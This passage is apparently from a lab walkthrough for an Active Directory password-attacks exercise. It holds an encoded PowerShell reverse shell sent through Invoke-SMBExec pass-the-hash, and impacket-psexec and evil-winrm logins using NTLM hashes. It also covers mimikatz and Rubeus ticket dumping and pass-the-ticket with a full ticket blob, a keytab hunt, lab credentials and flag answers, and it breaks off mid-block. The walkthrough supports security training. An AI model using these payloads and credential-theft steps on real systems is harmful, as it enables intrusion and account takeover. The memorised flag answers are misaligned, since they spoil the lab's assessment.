</span><span id="__span-179-14"><a id="__codelineno-179-14" name="__codelineno-179-14"></a><span class="nb">cd </span><span class="n">c</span><span class="p">:\</span><span class="n">tools</span><span class="p">\</span><span class="nb">Invoke-TheHash</span>
</span><span id="__span-179-15"><a id="__codelineno-179-15" name="__codelineno-179-15"></a><span class="nb">Import-Module</span> <span class="p">.\</span><span class="nb">Invoke-TheHash</span><span class="p">.</span><span class="n">psd1</span>
</span><span id="__span-179-16"><a id="__codelineno-179-16" name="__codelineno-179-16"></a>
</span><span id="__span-179-17"><a id="__codelineno-179-17" name="__codelineno-179-17"></a><span class="c"># We will launch the InvoketheHash with a reverse shell</span>
</span><span id="__span-179-18"><a id="__codelineno-179-18" name="__codelineno-179-18"></a><span class="nb">Invoke-SMBExec</span> <span class="n">-Target</span> <span class="n">172</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">10</span> <span class="n">-Domain</span> <span class="n">inlafreight</span><span class="p">.</span><span class="n">htb</span> <span class="n">-Username</span> <span class="n">julio</span> <span class="n">-Hash</span> <span class="n">64f12cddaa88057e06a81b54e73b949b</span> <span class="n">-Command</span> <span class="s2">&quot;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA3ADIALgAxADYALgAxAC4ANQAiACwAMQAyADMANAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=&quot;</span> <span class="n">-Verbose</span>
</span><span id="__span-179-19"><a id="__codelineno-179-19" name="__codelineno-179-19"></a>
</span><span id="__span-179-20"><a id="__codelineno-179-20" name="__codelineno-179-20"></a><span class="c"># In the cmd terminal we have obtained a reverse shell. Print the flag:</span>
</span><span id="__span-179-21"><a id="__codelineno-179-21" name="__codelineno-179-21"></a><span class="nb">type </span><span class="n">C</span><span class="p">:\</span><span class="n">julio</span><span class="p">\</span><span class="n">flag</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: JuL1()_N3w_fl@g</p>
<p><strong>Optional: John is a member of Remote Management Users for MS01. Try to connect to MS01 using john's account hash with impacket. What's the result? What happen if you use evil-winrm?. Mark DONE when finish.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-180-1">1</a></span>
<span class="normal"><a href="#__codelineno-180-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-180-1"><a id="__codelineno-180-1" name="__codelineno-180-1"></a><span class="n">impacket-psexec</span> <span class="n">john</span><span class="p">@</span><span class="nv">$ip</span> <span class="n">-hashes</span> <span class="p">:</span><span class="n">c4b0e1b10c7ce2c4723b4e2407ef81a2</span>
</span><span id="__span-180-2"><a id="__codelineno-180-2" name="__codelineno-180-2"></a><span class="n">evil-winrm</span> <span class="n">-i</span> <span class="nv">$ip</span> <span class="n">-u</span> <span class="n">john</span> <span class="n">-H</span> <span class="s1">&#39;c4b0e1b10c7ce2c4723b4e2407ef81a2&#39;</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: DONE</p>
<p><strong>RDP to with user "Administrator" and password <code>AnotherC0mpl3xP4$$</code>.  Connect to the target machine using RDP and the provided creds. Export all tickets present on the computer. How many users TGT did you collect?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-181-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-181-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-181-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-181-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-181-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-181-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-181-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-181-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-181-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-181-10">10</a></span>
<span class="normal"><a href="#__codelineno-181-11">11</a></span>
<span class="normal"><a href="#__codelineno-181-12">12</a></span>
<span class="normal"><a href="#__codelineno-181-13">13</a></span>
<span class="normal"><a href="#__codelineno-181-14">14</a></span>
<span class="normal"><a href="#__codelineno-181-15">15</a></span>
<span class="normal"><a href="#__codelineno-181-16">16</a></span>
<span class="normal"><a href="#__codelineno-181-17">17</a></span>
<span class="normal"><a href="#__codelineno-181-18">18</a></span>
<span class="normal"><a href="#__codelineno-181-19">19</a></span>
<span class="normal"><a href="#__codelineno-181-20">20</a></span>
<span class="normal"><a href="#__codelineno-181-21">21</a></span>
<span class="normal"><a href="#__codelineno-181-22">22</a></span>
<span class="normal"><a href="#__codelineno-181-23">23</a></span>
<span class="normal"><a href="#__codelineno-181-24">24</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-181-1"><a id="__codelineno-181-1" name="__codelineno-181-1"></a><span class="c"># Open a Powershell with admin rights.</span>
</span><span id="__span-181-2"><a id="__codelineno-181-2" name="__codelineno-181-2"></a><span class="nb">cd </span><span class="n">c</span><span class="p">:\</span><span class="n">tools</span>
</span><span id="__span-181-3"><a id="__codelineno-181-3" name="__codelineno-181-3"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-181-4"><a id="__codelineno-181-4" name="__codelineno-181-4"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-181-5"><a id="__codelineno-181-5" name="__codelineno-181-5"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">list</span>
</span><span id="__span-181-6"><a id="__codelineno-181-6" name="__codelineno-181-6"></a><span class="n">sekurlsa</span><span class="p">::</span><span class="n">tickets</span> <span class="p">/</span><span class="n">export</span>
</span><span id="__span-181-7"><a id="__codelineno-181-7" name="__codelineno-181-7"></a>
</span><span id="__span-181-8"><a id="__codelineno-181-8" name="__codelineno-181-8"></a>
</span><span id="__span-181-9"><a id="__codelineno-181-9" name="__codelineno-181-9"></a><span class="n">john</span>
</span><span id="__span-181-10"><a id="__codelineno-181-10" name="__codelineno-181-10"></a><span class="n">TGT</span> <span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">5a62c</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">40e10000-john</span><span class="nv">@krbtgt</span><span class="n">-INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">!</span>
</span><span id="__span-181-11"><a id="__codelineno-181-11" name="__codelineno-181-11"></a> <span class="n">Session</span> <span class="n">Key</span>       <span class="p">:</span> <span class="n">0x00000012</span> <span class="p">-</span> <span class="n">aes256_hmac</span>
</span><span id="__span-181-12"><a id="__codelineno-181-12" name="__codelineno-181-12"></a>             <span class="n">1d9ac815d1fc7dfb7a1a8d3088cbd3bb1d33987c4707f3a315c350150b61ebb0</span>
</span><span id="__span-181-13"><a id="__codelineno-181-13" name="__codelineno-181-13"></a>
</span><span id="__span-181-14"><a id="__codelineno-181-14" name="__codelineno-181-14"></a><span class="n">julio</span>
</span><span id="__span-181-15"><a id="__codelineno-181-15" name="__codelineno-181-15"></a><span class="n">TGT</span>  <span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">59c14</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">40e10000-julio</span><span class="nv">@krbtgt</span><span class="n">-INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">!</span>
</span><span id="__span-181-16"><a id="__codelineno-181-16" name="__codelineno-181-16"></a><span class="n">Session</span> <span class="n">Key</span>       <span class="p">:</span> <span class="n">0x00000012</span> <span class="p">-</span> <span class="n">aes256_hmac</span>
</span><span id="__span-181-17"><a id="__codelineno-181-17" name="__codelineno-181-17"></a>             <span class="n">ea463b091f018b64ba502d50c220ff8e6894e96e0d70263078c01df3c81d2410</span>
</span><span id="__span-181-18"><a id="__codelineno-181-18" name="__codelineno-181-18"></a>
</span><span id="__span-181-19"><a id="__codelineno-181-19" name="__codelineno-181-19"></a>
</span><span id="__span-181-20"><a id="__codelineno-181-20" name="__codelineno-181-20"></a><span class="n">david</span>
</span><span id="__span-181-21"><a id="__codelineno-181-21" name="__codelineno-181-21"></a> <span class="n">Session</span> <span class="n">Key</span>       <span class="p">:</span> <span class="n">0x00000012</span> <span class="p">-</span> <span class="n">aes256_hmac</span>
</span><span id="__span-181-22"><a id="__codelineno-181-22" name="__codelineno-181-22"></a>             <span class="n">dc35cd440cc4c4d93ba02c430e0144f61804827c95a6265ac15a720984436d10</span>
</span><span id="__span-181-23"><a id="__codelineno-181-23" name="__codelineno-181-23"></a>           <span class="n">Ticket</span>            <span class="p">:</span> <span class="n">0x00000012</span> <span class="p">-</span> <span class="n">aes256_hmac</span>       <span class="p">;</span> <span class="n">kvno</span> <span class="p">=</span> <span class="n">2</span>        <span class="p">[...]</span>
</span><span id="__span-181-24"><a id="__codelineno-181-24" name="__codelineno-181-24"></a>           <span class="p">*</span> <span class="n">Saved</span> <span class="n">to</span> <span class="n">file</span> <span class="p">[</span><span class="n">0</span><span class="p">;</span><span class="n">5af56</span><span class="p">]-</span><span class="n">2</span><span class="p">-</span><span class="n">0</span><span class="p">-</span><span class="n">40e10000-david</span><span class="nv">@krbtgt</span><span class="n">-INLANEFREIGHT</span><span class="p">.</span><span class="n">HTB</span><span class="p">.</span><span class="n">kirbi</span> <span class="p">!</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: 3</p>
<p>Use john's TGT to perform a Pass the Ticket attack and retrieve the flag from the shared folder <code>\\DC01.inlanefreight.htb\john</code></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-182-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-182-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-182-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-182-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-182-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-182-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-182-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-182-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-182-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-182-10">10</a></span>
<span class="normal"><a href="#__codelineno-182-11">11</a></span>
<span class="normal"><a href="#__codelineno-182-12">12</a></span>
<span class="normal"><a href="#__codelineno-182-13">13</a></span>
<span class="normal"><a href="#__codelineno-182-14">14</a></span>
<span class="normal"><a href="#__codelineno-182-15">15</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-182-1"><a id="__codelineno-182-1" name="__codelineno-182-1"></a><span class="c"># From the powershell session open in last question:</span>
</span><span id="__span-182-2"><a id="__codelineno-182-2" name="__codelineno-182-2"></a><span class="c"># Pass the ticket with mimikatz</span>
</span><span id="__span-182-3"><a id="__codelineno-182-3" name="__codelineno-182-3"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
</span><span id="__span-182-4"><a id="__codelineno-182-4" name="__codelineno-182-4"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
</span><span id="__span-182-5"><a id="__codelineno-182-5" name="__codelineno-182-5"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="s2">&quot;C:\tools\[0;5a62c]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span>
</span><span id="__span-182-6"><a id="__codelineno-182-6" name="__codelineno-182-6"></a><span class="n">exit</span>
</span><span id="__span-182-7"><a id="__codelineno-182-7" name="__codelineno-182-7"></a>
</span><span id="__span-182-8"><a id="__codelineno-182-8" name="__codelineno-182-8"></a><span class="c"># Enter a remote session</span>
</span><span id="__span-182-9"><a id="__codelineno-182-9" name="__codelineno-182-9"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DC01</span>
</span><span id="__span-182-10"><a id="__codelineno-182-10" name="__codelineno-182-10"></a>
</span><span id="__span-182-11"><a id="__codelineno-182-11" name="__codelineno-182-11"></a><span class="c"># Entering the shared unit </span>
</span><span id="__span-182-12"><a id="__codelineno-182-12" name="__codelineno-182-12"></a><span class="nb">cd </span><span class="p">\\</span><span class="n">DC01</span><span class="p">.</span><span class="n">inlanefreight</span><span class="p">.</span><span class="n">htb</span><span class="p">\</span><span class="n">john</span>
</span><span id="__span-182-13"><a id="__codelineno-182-13" name="__codelineno-182-13"></a>
</span><span id="__span-182-14"><a id="__codelineno-182-14" name="__codelineno-182-14"></a><span class="c"># Reading the flag</span>
</span><span id="__span-182-15"><a id="__codelineno-182-15" name="__codelineno-182-15"></a><span class="nb">type </span><span class="n">john</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Learn1ng_M0r3_Tr1cks_with_J0hn</p>
<p><strong>Use john's TGT to perform a Pass the Ticket attack and connect to the DC01 using PowerShell Remoting. Read the flag from C:\john\john.txt</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-183-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-183-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-183-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-183-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-183-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-183-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-183-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-183-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-183-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-183-10">10</a></span>
<span class="normal"><a href="#__codelineno-183-11">11</a></span>
<span class="normal"><a href="#__codelineno-183-12">12</a></span>
<span class="normal"><a href="#__codelineno-183-13">13</a></span>
<span class="normal"><a href="#__codelineno-183-14">14</a></span>
<span class="normal"><a href="#__codelineno-183-15">15</a></span>
<span class="normal"><a href="#__codelineno-183-16">16</a></span>
<span class="normal"><a href="#__codelineno-183-17">17</a></span>
<span class="normal"><a href="#__codelineno-183-18">18</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-183-1"><a id="__codelineno-183-1" name="__codelineno-183-1"></a><span class="c"># Extract keys</span>
</span><span id="__span-183-2"><a id="__codelineno-183-2" name="__codelineno-183-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">/</span><span class="n">nowrap</span>
</span><span id="__span-183-3"><a id="__codelineno-183-3" name="__codelineno-183-3"></a>
</span><span id="__span-183-4"><a id="__codelineno-183-4" name="__codelineno-183-4"></a><span class="c"># Creates a sacrificial process/logon session (Logon type 9). This will open a new terminal window.</span>
</span><span id="__span-183-5"><a id="__codelineno-183-5" name="__codelineno-183-5"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">createnetonly</span> <span class="p">/</span><span class="n">program</span><span class="p">:</span><span class="s2">&quot;C:\Windows\System32\cmd.exe&quot;</span> <span class="p">/</span><span class="n">show</span>
</span><span id="__span-183-6"><a id="__codelineno-183-6" name="__codelineno-183-6"></a>
</span><span id="__span-183-7"><a id="__codelineno-183-7" name="__codelineno-183-7"></a>
</span><span id="__span-183-8"><a id="__codelineno-183-8" name="__codelineno-183-8"></a><span class="c"># In the new terminal window import the ticket with Rubeus</span>
</span><span id="__span-183-9"><a id="__codelineno-183-9" name="__codelineno-183-9"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIFqDCCBaSgAwIBBaEDAgEWooIEojCCBJ5hggSaMIIElqADAgEFoRMbEUlOTEFORUZSRUlHSFQuSFRCoiYwJKADAgECoR0wGxsGa3JidGd0GxFJTkxBTkVGUkVJR0hULkhUQqOCBFAwggRMoAMCARKhAwIBAqKCBD4EggQ6czbmRrrk3Aah8tt1z57sIb9</span><span class="p">++</span><span class="n">eXZnVGldPnts7c</span><span class="p">+</span><span class="n">91NcpdsnRfoqueyM9PBc</span><span class="p">/</span><span class="n">o2XIzFdWmfrAbYbs3RGKjwI91tnlqs3ubMyvVSp9sW</span><span class="p">+</span><span class="n">7oMNgOyWeG7SVqHQVFmb6CQ723liVYf0goXaei1MUTFtyY6uiTYTS7h6SVxmXDyo2Ei34hviUdoJccJw21JMctBtoTfKGNNAgLzh9Va4DyAbdjr8RoyK99FcREcww1jrLmaIiuqQ4SQcK39fmvhinKJ2ONQ4D6X5g1L16cPNcKee07IZ</span><span class="p">/</span><span class="n">996NS3UqsMFou8BYzySmBj9JBN0sqSmKLaW</span><span class="p">+</span><span class="n">HdoX55ixnEGO</span><span class="p">/</span><span class="n">SzmgTfHHW9dbvZflfzMCB</span><span class="p">/</span><span class="n">TDih5SlTEYTAfW</span><span class="p">+</span><span class="n">g1DXI0o1YMUNRz3IxYPUy</span><span class="p">/</span><span class="n">OMqNQLbERmrcHt9fkgh0DlMfg94lcAM93To6Z0L7XtFYQF2i73J</span><span class="p">+</span><span class="n">o5i099P</span><span class="p">/</span><span class="n">a8381q7X0KWrZ</span><span class="p">+</span><span class="n">7lPnZbyks6J</span><span class="p">+</span><span class="n">jEY</span><span class="p">/</span><span class="n">wgKNAP8E16HPQVXDvtu4cbamEsp3VHq8yZ92JiA0GSJrqxCwF13eeYNUaL8Yf6GdSKE9KM72q5VGHyvlbeOmL0zIB8YR</span><span class="p">/</span><span class="n">HHl3ZfNQW8V48u4RoOBS</span><span class="p">+</span><span class="n">pXKq9UF7xrlh6rl1N01Nsgos58FOWzVncLRoheOez8rTxA44kgIz5RVVINRqBZj</span><span class="p">/</span><span class="n">k226t0OjAmk</span><span class="p">/</span><span class="n">hZQtbUQ5EH1</span><span class="p">/</span><span class="n">KuztL</span><span class="p">+</span><span class="n">3lver7nzlpS2IwbfWD9ScxMHwR8PImz0w3kcsfB8VYX9DSHNOUwhOB5QuBH</span><span class="p">+</span><span class="n">Oc67IQoMUTHCpLgWY</span><span class="p">+</span><span class="n">kNNj</span><span class="p">+</span><span class="n">yWu</span><span class="p">/</span><span class="n">2QDBvHKVuHpIh1</span><span class="p">+</span><span class="n">D4nEXCTOMKs42ZVsK6rmzpFM3C8eARj83zreW68HUTiZJBWwkdk6v</span><span class="p">/</span><span class="n">4BuZNT0xp8mIf</span><span class="p">/</span><span class="n">LzneGSdZIELO5B1MJbFaKs</span><span class="p">/</span><span class="n">JcsdRtjdv2LfGaXp9MwuQ3xRCkTPUjJNERwGyw87xQhqfNxwpGXJIlWaTFMKqcFC7VDRLsSEbNIinrIRjiX4tvBNfnNgxWGG2YFCDPz</span><span class="p">/</span><span class="n">23vUuRCfxOnmd7SWLrIUY9g6uzdGCNfxN2zEj1gQgaXfjucouF7xw</span><span class="p">+</span><span class="n">JwMZ1go7CNXxfKyk5t</span><span class="p">+</span><span class="n">uzgEJY7jWbQO17zamD1EIIQNEsXI403KXfJsUo</span><span class="p">/</span><span class="n">aaKIpeW4EkUbVBHwv5gOPmRKpfsSG1aXMYH40G151RJXW</span><span class="p">/</span><span class="n">86h4kYB0C</span><span class="p">+</span><span class="n">h41I5EizwIjzUJBp6VPmoNZlJcFgPNcZOAy4q7O</span><span class="p">+</span><span class="n">ubFepmnkE3gZBmTd5qvqH51ckz9</span><span class="p">/</span><span class="n">l6DqrkyvPUYOS0hWLA27Z7n0HOxhxgs7xInIsdf</span><span class="p">/</span><span class="n">YpZ5cnLFBgzTasFxmjAofIVtomvc7PeMtwVyHaqJggIT0mV1</span><span class="p">/</span><span class="n">SnEwriWucerepLen2nBnU6ezqbiJqpBOOKqGuyftYkCnFXWjYQf3nkkWR3ULi</span><span class="p">/</span><span class="n">WpjNPlnusTWUUHHzLy9jHGVGmyO8CodQs6j5YkI6RjMi88UXR1CIZtMuCao0na3e73ujX2FyjgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCAdmsgV0fx9</span><span class="p">+</span><span class="n">3oajTCIy9O7HTOYfEcH86MVw1AVC2HrsKETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA</span><span class="p">+</span><span class="n">gAwIBAaEIMAYbBGpvaG6jBwMFAEDhAAClERgPMjAyNTAxMTkwODQ3MDJaphEYDzIwMjUwMTE5MTg0NzAyWqcRGA8yMDI1MDEyNjA4NDcwMlqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEUlOTEFORUZSRUlHSFQuSFRC</span>
</span><span id="__span-183-10"><a id="__codelineno-183-10" name="__codelineno-183-10"></a>
</span><span id="__span-183-11"><a id="__codelineno-183-11" name="__codelineno-183-11"></a><span class="c"># Enter a remote session</span>
</span><span id="__span-183-12"><a id="__codelineno-183-12" name="__codelineno-183-12"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DC01</span>
</span><span id="__span-183-13"><a id="__codelineno-183-13" name="__codelineno-183-13"></a>
</span><span id="__span-183-14"><a id="__codelineno-183-14" name="__codelineno-183-14"></a><span class="c"># Entering the shared unit </span>
</span><span id="__span-183-15"><a id="__codelineno-183-15" name="__codelineno-183-15"></a><span class="nb">cd </span><span class="n">c</span><span class="p">:\</span><span class="n">john</span>
</span><span id="__span-183-16"><a id="__codelineno-183-16" name="__codelineno-183-16"></a>
</span><span id="__span-183-17"><a id="__codelineno-183-17" name="__codelineno-183-17"></a><span class="c"># Reading the flag</span>
</span><span id="__span-183-18"><a id="__codelineno-183-18" name="__codelineno-183-18"></a><span class="nb">type </span><span class="n">john</span><span class="p">.</span><span class="n">txt</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>P4$$_th3_Tick3T_PSR</code></p>
<p>Optional: Try to use both tools, Mimikatz and Rubeus, to perform the attacks without relying on each other. Mark DONE when finish.</p>
<p>Results: DONE</p>
<p><strong>SSH to  with user "david@inlanefreight.htb" and password "Password2". Connect to the target machine using SSH to the port TCP/2222 and the provided credentials. Read the flag in David's home directory.</strong></p>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-184-1">1</a></span>
<span class="normal"><a href="#__codelineno-184-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-184-1"><a id="__codelineno-184-1" name="__codelineno-184-1"></a># Enum services
</span><span id="__span-184-2"><a id="__codelineno-184-2" name="__codelineno-184-2"></a>nmap -p 22,2222,3389 $ip                          
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-185-1">1</a></span>
<span class="normal"><a href="#__codelineno-185-2">2</a></span>
<span class="normal"><a href="#__codelineno-185-3">3</a></span>
<span class="normal"><a href="#__codelineno-185-4">4</a></span>
<span class="normal"><a href="#__codelineno-185-5">5</a></span>
<span class="normal"><a href="#__codelineno-185-6">6</a></span>
<span class="normal"><a href="#__codelineno-185-7">7</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-185-1"><a id="__codelineno-185-1" name="__codelineno-185-1"></a>Nmap scan report 
</span><span id="__span-185-2"><a id="__codelineno-185-2" name="__codelineno-185-2"></a>Host is up (0.16s latency).
</span><span id="__span-185-3"><a id="__codelineno-185-3" name="__codelineno-185-3"></a>
</span><span id="__span-185-4"><a id="__codelineno-185-4" name="__codelineno-185-4"></a>PORT     STATE  SERVICE
</span><span id="__span-185-5"><a id="__codelineno-185-5" name="__codelineno-185-5"></a>22/tcp   closed ssh
</span><span id="__span-185-6"><a id="__codelineno-185-6" name="__codelineno-185-6"></a>2222/tcp open   EtherNetIP-1
</span><span id="__span-185-7"><a id="__codelineno-185-7" name="__codelineno-185-7"></a>3389/tcp open   ms-wbt-server
</span></code></pre></div></td></tr></table></div>
<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-186-1">1</a></span>
<span class="normal"><a href="#__codelineno-186-2">2</a></span>
<span class="normal"><a href="#__codelineno-186-3">3</a></span>
<span class="normal"><a href="#__codelineno-186-4">4</a></span>
<span class="normal"><a href="#__codelineno-186-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-186-1"><a id="__codelineno-186-1" name="__codelineno-186-1"></a># Step 1: Establish a Local Port Forwarding from Kali to MS01 via port 2222 (port 22 is closed)
</span><span id="__span-186-2"><a id="__codelineno-186-2" name="__codelineno-186-2"></a>ssh david@inlanefreight.htb@10.129.32.62 -p 2222 -L 9999:172.16.1.15:22 
</span><span id="__span-186-3"><a id="__codelineno-186-3" name="__codelineno-186-3"></a>
</span><span id="__span-186-4"><a id="__codelineno-186-4" name="__codelineno-186-4"></a># Print the flag:
</span><span id="__span-186-5"><a id="__codelineno-186-5" name="__codelineno-186-5"></a>cat flag.txt
</span></code></pre></div></td></tr></table></div>
<p>Results: <code>Gett1ng_Acc3$$_to_LINUX01</code> </p>
<p><strong>Which group can connect to LINUX01?</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-187-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-187-1"><a id="__codelineno-187-1" name="__codelineno-187-1"></a><span class="n">realm</span> <span class="n">list</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: Linux Admins</p>
<p><strong>Look for a keytab file that you have read and write access. Submit the file name as a response.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-188-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-188-1"><a id="__codelineno-188-1" name="__codelineno-188-1"></a><span class="n">find</span> <span class="p">/</span> <span class="n">-type</span> <span class="n">f</span> <span class="n">-name</span> <span class="s2">&quot;*.keytab&quot;</span> <span class="n">2</span><span class="p">&gt;/</span><span class="n">dev</span><span class="p">/</span><span class="n">null</span>
</span></code></pre></div></td></tr></table></div>
<p>Results: carlos.keytab</p>
<p><strong>Extract the hashes from the keytab file you found, crack the password, log in as the user and submit the flag in the user's home directory.</strong></p>
<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-189-1"> 1</a></span>
<span class="normal"><a href="#__codelineno-189-2"> 2</a></span>
<span class="normal"><a href="#__codelineno-189-3"> 3</a></span>
<span class="normal"><a href="#__codelineno-189-4"> 4</a></span>
<span class="normal"><a href="#__codelineno-189-5"> 5</a></span>
<span class="normal"><a href="#__codelineno-189-6"> 6</a></span>
<span class="normal"><a href="#__codelineno-189-7"> 7</a></span>
<span class="normal"><a href="#__codelineno-189-8"> 8</a></span>
<span class="normal"><a href="#__codelineno-189-9"> 9</a></span>
<span class="normal"><a href="#__codelineno-189-10">10</a></span>
<span class="normal"><a href="#__codelineno-189-11">11</a></span>
